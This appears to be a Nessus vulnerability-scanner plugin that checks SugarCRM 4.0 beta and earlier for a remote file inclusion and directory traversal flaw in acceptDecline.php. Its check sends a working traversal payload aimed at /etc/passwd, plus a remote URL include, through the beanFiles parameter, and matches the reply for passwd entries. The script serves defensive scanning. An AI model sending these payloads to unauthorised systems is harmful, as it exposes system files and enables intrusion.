#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (4/7/2009)


include("compat.inc");

if (description) {
script_id(20286);
script_version("$Revision: 1.12 $");

script_cve_id("CVE-2005-4087", "CVE-2005-4086");
script_bugtraq_id(15760);
script_xref(name:"OSVDB", value:"21526");

script_name(english:"SugarCRM <= 4.0 beta acceptDecline.php Remote File Inclusion");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to multiple
flaws." );
 script_set_attribute(attribute:"description", value:
"SugarCRM is a Customer Relationship Manager written in PHP. 

The version of SugarCRM installed on the remote host does not properly
sanitize user input in the 'beanFiles[]' parameter in the
'acceptDecline.php' file.  A attacker can use this flaw to display
sensitive information and to include malicious code to execute
arbitrary commands. 

This vulnerability is exploitable if 'register_globals' is enabled." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/sugar_suite_40beta.html" );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=113397762406598&w=2" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Sugar Suite version 3.5.1e and/or disable PHP's 
'register_globals' setting." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


script_summary(english:"Check if SugarCRM is vulnerable to Directory Traversal and Remote File Inclusion");

script_category(ACT_ATTACK);
script_family(english:"CGI abuses");

script_copyright(english:"This script is Copyright (C) 2005-2009 Ferdy Riphagen");

script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = list_uniq(make_list("/sugarsuite", "/sugarcrm", "/crm", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{ 
  string[0] = "../../../../../../../../etc/passwd";
  if ( thorough_tests )
	{
  	string[1] = string("http://", get_host_name(), "/robots.txt");
	pat =  "root:.*:0:[01]:.*:|User-agent:";
	}
   else
	pat = "root:.*:0:[01]:.*:";
 
  for(exp = 0; string[exp]; exp++)
  {
   req = http_get(item:string(dir, "/acceptDecline.php?beanFiles[1]=", string[exp], "&beanList[1]=1&module=1"), port:port);
   recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if(recv == NULL)exit(0);
   
   if( egrep(pattern: pat, string:recv))
   {
    security_hole(port);
    exit(0);
   }
  }
}
